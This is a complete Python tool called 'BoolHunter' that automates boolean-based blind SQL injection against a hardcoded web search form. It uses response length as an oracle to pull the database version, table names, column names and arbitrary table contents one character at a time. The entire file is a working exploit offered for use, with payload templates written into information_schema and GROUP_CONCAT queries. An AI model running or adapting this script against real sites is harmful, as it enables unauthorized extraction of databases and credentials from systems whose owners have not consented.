#!/usr/bin/python3

import sys
import signal
import urllib.parse
import requests
import argparse
import urllib
from urllib3.exceptions import InsecureRequestWarning
from pwn import * 

#For SSL Errors.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#Globals
url = 'http://tarz.rx/arama' #Change
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890,.-;:_{}[]!@"#$%&/()='

# ASCII Art
asci_art = """
    ____              ____  __            __           
   / __ )____  ____  / / / / /_  ______  / /____  _____
  / __  / __ \/ __ \/ / /_/ / / / / __ \/ __/ _ \/ ___/
 / /_/ / /_/ / /_/ / / __  / /_/ / / / / /_/  __/ /    
/_____/\____/\____/_/_/ /_/\__,_/_/ /_/\__/\___/_/     
                                                    
by Alpy06
"""

#Ctrl+C

def exit_handler(sig, frame):
    print("\n[-] Bye!")
    sys.exit(1)

signal.signal(signal.SIGINT, exit_handler)

#This function make post request. If you have different scenarios, you should change http method and encoding.
def check(payload):
    data = 'arama=&aranan=' + urllib.parse.quote(payload)
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    req = requests.post(url, data=data, headers=headers, verify=False)

    content_length = req.headers.get('Content-Length')
    if content_length:
        try:
            c_length = int(content_length)
        except ValueError:
            c_length = len(req.text)
    else:
        c_length = len(req.text)

    if c_length > 12965:
        return 1
    return 0

    
def main():
    print(asci_art)
    parser = argparse.ArgumentParser(description="BoolHunter")
    parser.add_argument("--version", action="store_true", help="Get database version. usage: --version")
    parser.add_argument("--tables", action="store_true", help="Get tables. usage: --tables")
    parser.add_argument("--columns", nargs=1, help="Get column names of specific table. usage: --columns table_name")
    parser.add_argument('--data', nargs=3, help='Extract data from table. usage: --data col1 col2')

    args = parser.parse_args()
    result = ''

    try:
        if args.version:
            payload_template = "foo' OR SUBSTRING(@@version,%d,1)='%c'-- -"
        elif args.tables:
            payload_template = "foo' OR SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema=database()),%d,1)='%c'-- -"
        elif args.columns:
            table_name = args.columns[0]
            payload_template = f"foo' OR SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}'),%d,1)='%c'-- -"
        elif args.data:
            column1, column2, table_name = args.data
            payload_template = f"foo' OR SUBSTRING((SELECT GROUP_CONCAT({column1},':',{column2}) FROM {table_name}),%d,1)='%c"
        else:
            print("No valid argument. Use --help for more information.")
            sys.exit(1)
    except Exception as e:   
        print(f"Error: {e}")
        sys.exit(1)


    p1 = log.progress("Result: ")
    p2 = log.progress("Payload: ")

    for i in range(1, 170): # If the value length is longer than expected, increase this value.
        for c in s:
            
            payload = payload_template % (i, c) 
            p2.status("%s" % payload)

            if check(payload):
                result += c
                p1.status("%s" % result)
                break

    log.info("Result: %s" % result)

if __name__ == "__main__":
    main()
